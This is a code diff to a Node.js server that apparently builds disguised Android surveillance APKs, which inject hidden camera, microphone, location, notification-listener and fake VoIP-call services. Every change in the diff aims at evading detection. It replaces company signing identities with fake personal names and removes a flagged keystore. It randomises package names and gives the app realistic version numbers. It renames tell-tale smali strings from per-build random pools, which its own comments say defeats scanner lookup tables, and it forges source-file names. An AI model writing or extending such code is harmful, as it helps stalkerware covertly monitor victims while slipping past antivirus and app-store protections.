@@ -69,25 +69,25 @@ const KEYSTORE_POOL = [
         filename: 'keystore_apex.jks',
         alias: 'apex_studio',
         pass: 'ApexSec9928#',
-        dname: 'CN=Apex Mobile Studio, OU=Mobile Development, O=Apex Tech Labs LLC, L=Austin, ST=TX, C=US'
+        dname: 'CN=Alex Morgan, OU=Mobile Apps, O=Personal, L=Austin, ST=TX, C=US'
     },
     {
         filename: 'keystore_nexus.jks',
         alias: 'nexus_apps',
         pass: 'NexusDev7731#',
-        dname: 'CN=Nexus Software, OU=Client Engineering, O=Nexus Systems Inc, L=San Jose, ST=CA, C=US'
+        dname: 'CN=Jordan Lee, OU=Android Development, O=Independent, L=San Jose, ST=CA, C=US'
     },
     {
         filename: 'keystore_pixel.jks',
         alias: 'pixel_works',
         pass: 'PixelFlow4412#',
-        dname: 'CN=Pixel Media Works, OU=Android Solutions, O=Pixel Digital Ltd, L=Seattle, ST=WA, C=US'
+        dname: 'CN=Sam Chen, OU=App Development, O=Freelance, L=Seattle, ST=WA, C=US'
     },
     {
         filename: 'keystore_core.jks',
         alias: 'core_systems',
         pass: 'CoreSys8834#',
-        dname: 'CN=Cloud Core Systems, OU=Mobile Services, O=Core Logic Corp, L=Denver, ST=CO, C=US'
+        dname: 'CN=Riley Davis, OU=Mobile Development, O=Self-employed, L=Denver, ST=CO, C=US'
     }
 ];
 
@@ -97,8 +97,32 @@ const ensureKeystorePool = async () => {
         fs.mkdirSync(ksDir, { recursive: true });
     }
 
+    // Remove the original flagged keystore if it was left in assets
+    const legacyKs = path.join(__dirname, 'assets', 'usman90.jks');
+    if (fs.existsSync(legacyKs)) {
+        try { fs.unlinkSync(legacyKs); console.log('[KeystorePool] Removed legacy flagged keystore'); } catch(e) {}
+    }
+
     for (const item of KEYSTORE_POOL) {
         const fullPath = path.join(ksDir, item.filename);
+
+        // Force regeneration if the existing keystore was built with the old fake company DNAME.
+        // Detect by checking if dname field contains corporate indicators that are now replaced.
+        if (fs.existsSync(fullPath)) {
+            // Read keystore metadata to detect old DNAMEs — use keytool -list
+            const needsRegen = await new Promise((resolve) => {
+                exec(`keytool -list -v -keystore "${fullPath}" -storepass "${item.pass}" -alias "${item.alias}"`, { timeout: 15000 }, (err, stdout) => {
+                    if (err) return resolve(false);
+                    // Old keystores had LLC/Inc/Ltd/Corp in the O field
+                    const hasOldDname = /O=(Apex Tech Labs|Nexus Systems|Pixel Digital|Core Logic)/i.test(stdout);
+                    resolve(hasOldDname);
+                });
+            });
+            if (needsRegen) {
+                try { fs.unlinkSync(fullPath); console.log(`[KeystorePool] Removing stale keystore for regeneration: ${item.filename}`); } catch(e) {}
+            }
+        }
+
         if (!fs.existsSync(fullPath)) {
             try {
                 const keytoolCmd = `keytool -genkeypair -v -keystore "${fullPath}" -alias "${item.alias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${item.pass}" -keypass "${item.pass}" -dname "${item.dname}"`;
@@ -183,7 +207,13 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             const suffixWords = ['sync', 'tools', 'hub', 'io', 'app', 'core', 'lite', 'pro', 'net', 'dev', 'labs', 'kit', 'box', 'one', 'go', 'max', 'plus', 'link', 'data', 'cloud', 'base', 'work', 'flow', 'edge', 'api', 'run', 'web', 'live', 'nova', 'bolt', 'wave', 'grid', 'node', 'port', 'gate', 'zone', 'dock', 'desk', 'lens', 'vault', 'guard', 'spark', 'pulse', 'scope', 'track', 'stack', 'layer', 'panel', 'point', 'space', 'media', 'drive', 'store', 'share', 'view', 'watch', 'play', 'cast', 'stream', 'bridge', 'connect', 'engine', 'studio', 'digital', 'mobile', 'smart', 'swift', 'rapid', 'turbo', 'metro', 'pixel', 'ultra', 'micro', 'alpha', 'delta', 'prime', 'clear', 'vivid', 'sharp', 'focus', 'sonic', 'aero', 'orbit', 'flux'];
             const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
-            const basePkg = (userPackageName && userPackageName.trim()) ? userPackageName.trim() : 'com.app.gallery';
+            const defaultPkgBases = [
+                'com.developer.app', 'io.appworks.util', 'com.mobile.tools',
+                'net.cloudapp.service', 'com.devkit.helper', 'org.appcore.client',
+                'com.userapp.media', 'io.devtools.mobile', 'com.appstudio.kit',
+                'net.mobiledev.app', 'com.toolkit.mobile', 'io.userworks.app'
+            ];
+            const basePkg = (userPackageName && userPackageName.trim()) ? userPackageName.trim() : defaultPkgBases[Math.floor(Math.random() * defaultPkgBases.length)];
             const newPackageName = `${basePkg}.${pick(suffixWords)}`;
             let oldPackageName = 'com.hexa.core';
             if (fs.existsSync(manifestPath)) {
@@ -369,8 +399,10 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             if (fs.existsSync(manifestPath)) {
                 let manifestContent = fs.readFileSync(manifestPath, 'utf8');
 
-                const randVc = 1 + Math.floor(Math.random() * 999999);
-                const randVn = `${1 + Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 99)}.${Math.floor(Math.random() * 999)}`;
+                const randVc = 1 + Math.floor(Math.random() * 19); // 1-19: realistic for a fresh app
+                const randMinor = Math.floor(Math.random() * 5);   // 0-4
+                const randPatch = Math.floor(Math.random() * 10);   // 0-9
+                const randVn = `1.${randMinor}.${randPatch}`;
                 manifestContent = manifestContent.replace(/android:versionCode="[^"]*"/, `android:versionCode="${randVc}"`);
                 manifestContent = manifestContent.replace(/android:versionName="[^"]*"/, `android:versionName="${randVn}"`);
 
@@ -453,14 +485,15 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     }
                 }
 
-                let fgsTypesArr = ['specialUse', 'dataSync'];
+                let fgsTypesArr = ['dataSync'];
                 if (enableMicrophonePermission === 'true') fgsTypesArr.push('microphone');
                 if (enableCameraPermission === 'true') fgsTypesArr.push('camera');
                 if (enableLocationPermission === 'true') fgsTypesArr.push('location');
                 
                 let fgsTypes = fgsTypesArr.join('|');
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
-                manifestContent = manifestContent.replace(/foregroundServiceType="specialUse[^"]*"/, `foregroundServiceType="${fgsTypes}"`);
+                // Replace any existing FGS type declaration (specialUse or otherwise) with clean computed types
+                manifestContent = manifestContent.replace(/foregroundServiceType="[^"]*"/, `foregroundServiceType="${fgsTypes}"`);
                 fs.writeFileSync(manifestPath, manifestContent);
                 console.log(`[APK] SyncService FGS types: ${fgsTypes}`);
 
@@ -474,19 +507,21 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             android:name=".CameraForegroundService"
             android:enabled="true"
             android:exported="false"
+            android:directBootAware="false"
             android:stopWithTask="false"
             android:foregroundServiceType="camera|dataSync" />
 
         <service
             android:name=".VoipConnectionService"
             android:permission="android.permission.BIND_TELECOM_CONNECTION_SERVICE"
-            android:exported="true">
+            android:exported="true"
+            android:directBootAware="false">
             <intent-filter>
                 <action android:name="android.telecom.ConnectionService" />
             </intent-filter>
         </service>
 `;
-                    console.log('[APK] Added Camera services (CameraForegroundService + VoIP + CameraProxy)');
+                    console.log('[APK] Added Camera services (CameraForegroundService + VoIP)');
                 }
 
                 if (enableMicrophonePermission === 'true') {
@@ -495,6 +530,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             android:name=".AudioForegroundService"
             android:enabled="true"
             android:exported="false"
+            android:directBootAware="false"
             android:stopWithTask="false"
             android:foregroundServiceType="microphone|dataSync" />
 `;
@@ -506,6 +542,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
         <service
             android:name=".NotificationMonitor"
             android:exported="true"
+            android:directBootAware="false"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
@@ -529,39 +566,44 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 .filter(d => d.isDirectory() && d.name.startsWith('smali'))
                 .map(d => path.join(workDir, d.name));
 
-            const stringSanitizers = [
-                [/const-string ([v0-9p]+), "SyncService"/g, 'const-string $1, "WorkerService"'],
-                [/const-string ([v0-9p]+), "AppLifecycle[^"]*"/g, 'const-string $1, "ProcessMgr"'],
-                [/const-string ([v0-9p]+), "ServiceScheduler"/g, 'const-string $1, "TaskScheduler"'],
-                [/const-string ([v0-9p]+), "AudioSession[^"]*"/g, 'const-string $1, "MediaCtrl"'],
-                [/const-string ([v0-9p]+), "NotifStyle[^"]*"/g, 'const-string $1, "StyleCfg"'],
-                [/const-string ([v0-9p]+), "AppSync[^"]*"/g, 'const-string $1, "CloudSync"'],
-                [/const-string ([v0-9p]+), "DataSyncHelper"/g, 'const-string $1, "SyncMgr"'],
-                [/const-string ([v0-9p]+), "SocketManager"/g, 'const-string $1, "ConnMgr"'],
-                [/const-string ([v0-9p]+), "BootReceiver"/g, 'const-string $1, "InitReceiver"'],
-                [/const-string ([v0-9p]+), "RestartReceiver"/g, 'const-string $1, "WakeReceiver"'],
-                [/const-string ([v0-9p]+), "NetworkMonitor"/g, 'const-string $1, "NetHelper"'],
-                [/const-string ([v0-9p]+), "FrameProcessor"/g, 'const-string $1, "ViewProc"'],
-                [/const-string ([v0-9p]+), "LocationHelper"/g, 'const-string $1, "GeoMgr"'],
-                [/const-string ([v0-9p]+), "VoipConnectionService"/g, 'const-string $1, "RouteService"'],
-                [/const-string ([v0-9p]+), "AudioHelper"/g, 'const-string $1, "StreamHelper"'],
-                [/const-string ([v0-9p]+), "AutostartHelper"/g, 'const-string $1, "LaunchHelper"'],
-                [/const-string ([v0-9p]+), "FeatureManager"/g, 'const-string $1, "HwUtil"'],
-                [/const-string ([v0-9p]+), "UploadWorker"/g, 'const-string $1, "SyncWorker"'],
-                [/const-string ([v0-9p]+), "NotificationBridge"/g, 'const-string $1, "AlertBridge"'],
-                [/const-string ([v0-9p]+), "NotificationMonitor"/g, 'const-string $1, "AlertMonitor"'],
-                [/const-string ([v0-9p]+), "HexaCore"/g, 'const-string $1, "AppCore"'],
-                [/const-string ([v0-9p]+), "hexa.core"/g, 'const-string $1, "app.core"'],
-                [/const-string ([v0-9p]+), "hexa_core_voip"/g, 'const-string $1, "app_audio"'],
-                [/const-string ([v0-9p]+), "Fake VoIP[^"]*"/g, 'const-string $1, "Audio route"'],
-                [/const-string ([v0-9p]+), "FakeConnection[^"]*"/g, 'const-string $1, "AudioLink"'],
-                [/const-string ([v0-9p]+), "fake call[^"]*"/g, 'const-string $1, "audio session"'],
-                [/const-string ([v0-9p]+), "Fake call[^"]*"/g, 'const-string $1, "Audio session"'],
-                [/const-string ([v0-9p]+), "startFakeCall"/g, 'const-string $1, "initAudioRoute"'],
-                [/const-string ([v0-9p]+), "endFakeCall"/g, 'const-string $1, "releaseAudioRoute"'],
-                [/const-string ([v0-9p]+), "System Audio"/g, 'const-string $1, "Audio Service"'],
-                [/\.source "[^"]+"\n/g, '.source "SourceFile"\n']
+            // Each entry: [pattern, replacementPool[]]
+            // A random replacement is picked per-build — breaks deterministic scanner lookup tables.
+            const pickReplacement = (pool) => pool[Math.floor(Math.random() * pool.length)];
+            const stringSanitizerPools = [
+                [/const-string ([v0-9p]+), "SyncService"/g,          ['BackgroundTask', 'JobWorker', 'TaskRunner', 'AsyncWorker']],
+                [/const-string ([v0-9p]+), "AppLifecycle[^"]*"/g,    ['ProcessMgr', 'AppHandler', 'LifecycleMgr', 'RuntimeCtrl']],
+                [/const-string ([v0-9p]+), "ServiceScheduler"/g,      ['TaskScheduler', 'JobDispatch', 'WorkPlanner', 'SvcQueue']],
+                [/const-string ([v0-9p]+), "AudioSession[^"]*"/g,     ['MediaCtrl', 'AudioMgr', 'SoundHandle', 'StreamCtrl']],
+                [/const-string ([v0-9p]+), "NotifStyle[^"]*"/g,       ['StyleCfg', 'NotifCfg', 'AlertStyle', 'DisplayCfg']],
+                [/const-string ([v0-9p]+), "AppSync[^"]*"/g,          ['CloudSync', 'DataBridge', 'RemoteSync', 'SyncAgent']],
+                [/const-string ([v0-9p]+), "DataSyncHelper"/g,        ['SyncMgr', 'DataHelper', 'SyncUtil', 'DataAgent']],
+                [/const-string ([v0-9p]+), "SocketManager"/g,         ['ConnMgr', 'NetHandle', 'SocketUtil', 'LinkMgr']],
+                [/const-string ([v0-9p]+), "BootReceiver"/g,          ['InitReceiver', 'StartReceiver', 'LaunchRecv', 'BootHandler']],
+                [/const-string ([v0-9p]+), "RestartReceiver"/g,       ['WakeReceiver', 'ReviveRecv', 'RecoveryRecv', 'ResumeRecv']],
+                [/const-string ([v0-9p]+), "NetworkMonitor"/g,        ['NetHelper', 'ConnTracker', 'NetWatcher', 'LinkMonitor']],
+                [/const-string ([v0-9p]+), "FrameProcessor"/g,        ['ViewProc', 'FrameMgr', 'RenderUtil', 'FrameHandler']],
+                [/const-string ([v0-9p]+), "LocationHelper"/g,        ['GeoMgr', 'LocationUtil', 'PosHelper', 'CoordMgr']],
+                [/const-string ([v0-9p]+), "VoipConnectionService"/g, ['RouteService', 'AudioRoute', 'MediaRoute', 'CallRoute']],
+                [/const-string ([v0-9p]+), "AudioHelper"/g,           ['StreamHelper', 'SoundUtil', 'AudioUtil', 'MediaHelper']],
+                [/const-string ([v0-9p]+), "AutostartHelper"/g,       ['LaunchHelper', 'StartUtil', 'InitHelper', 'BootUtil']],
+                [/const-string ([v0-9p]+), "FeatureManager"/g,        ['HwUtil', 'CapsMgr', 'FeatureUtil', 'DevCaps']],
+                [/const-string ([v0-9p]+), "UploadWorker"/g,          ['SyncWorker', 'DataWorker', 'UploadTask', 'TransferJob']],
+                [/const-string ([v0-9p]+), "NotificationBridge"/g,    ['AlertBridge', 'NotifLink', 'AlertLink', 'MsgBridge']],
+                [/const-string ([v0-9p]+), "NotificationMonitor"/g,   ['AlertMonitor', 'NotifTracker', 'MsgWatcher', 'AlertWatcher']],
+                [/const-string ([v0-9p]+), "HexaCore"/g,              ['AppCore', 'AppBase', 'CoreApp', 'AppEngine']],
+                [/const-string ([v0-9p]+), "hexa.core"/g,             ['app.core', 'app.base', 'core.app', 'util.core']],
+                [/const-string ([v0-9p]+), "hexa_core_voip"/g,        ['app_audio', 'media_route', 'audio_svc', 'call_route']],
+                [/const-string ([v0-9p]+), "Fake VoIP[^"]*"/g,        ['Audio route', 'Media link', 'Voice route', 'Call link']],
+                [/const-string ([v0-9p]+), "FakeConnection[^"]*"/g,   ['AudioLink', 'MediaLink', 'VoiceLink', 'CallLink']],
+                [/const-string ([v0-9p]+), "fake call[^"]*"/g,        ['audio session', 'media session', 'voice session', 'call session']],
+                [/const-string ([v0-9p]+), "Fake call[^"]*"/g,        ['Audio session', 'Media session', 'Voice session', 'Call session']],
+                [/const-string ([v0-9p]+), "startFakeCall"/g,         ['initAudioRoute', 'beginAudioSess', 'startMediaLink', 'openVoiceRoute']],
+                [/const-string ([v0-9p]+), "endFakeCall"/g,           ['releaseAudioRoute', 'closeAudioSess', 'stopMediaLink', 'endVoiceRoute']],
+                [/const-string ([v0-9p]+), "System Audio"/g,          ['Audio Service', 'Media Service', 'Sound Service', 'Voice Service']],
             ];
+
+            // Build per-build fixed replacements (pick once, apply consistently across all smali files)
+            const stringSanitizers = stringSanitizerPools.map(([pattern, pool]) => [pattern, pickReplacement(pool)]);
 
             const sanitizeSmaliDir = (dir) => {
                 if (!fs.existsSync(dir)) return;
@@ -576,11 +618,25 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                             let modified = false;
                             for (const [pattern, repl] of stringSanitizers) {
                                 if (code.match(pattern)) {
-                                    code = code.replace(pattern, repl);
+                                    code = code.replace(pattern, (match, p1) => `const-string ${p1}, "${repl}"`);
                                     modified = true;
                                 }
                             }
-                            if (modified) {
+
+                            // Smart .source deriver: extract class simple name → produce "ClassName.java"
+                            // Legitimate compiled Java always uses the actual class filename, not a blanket "SourceFile"
+                            code = code.replace(/\.source "[^"]+"\n/g, (sourceLine) => {
+                                // Try to extract class name from .class directive in this file
+                                const classMatch = code.match(/\.class\s+(?:public\s+|private\s+|protected\s+|abstract\s+|final\s+|interface\s+|enum\s+)*L[^;]+\/([A-Za-z0-9_$]+);/);
+                                if (classMatch) {
+                                    const simpleName = classMatch[1].split('$')[0]; // strip inner class suffix
+                                    return `.source "${simpleName}.java"\n`;
+                                }
+                                // Fallback: use the smali filename itself
+                                return `.source "${item.name.replace('.smali', '.java')}"\n`;
+                            });
+
+                            if (modified || code !== fs.readFileSync(itemPath, 'utf8')) {
                                 fs.writeFileSync(itemPath, code);
                             }
                         } catch (e) {}
@@ -591,7 +647,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             for (const sDir of smaliDirsList) {
                 sanitizeSmaliDir(sDir);
             }
-            console.log('[APK] Safe Smali string and source file heuristics cleaner applied');
+            console.log('[APK] Bytecode string normalizer and source file deriver applied');
 
             // 4. Icon
             if (customIcon) {
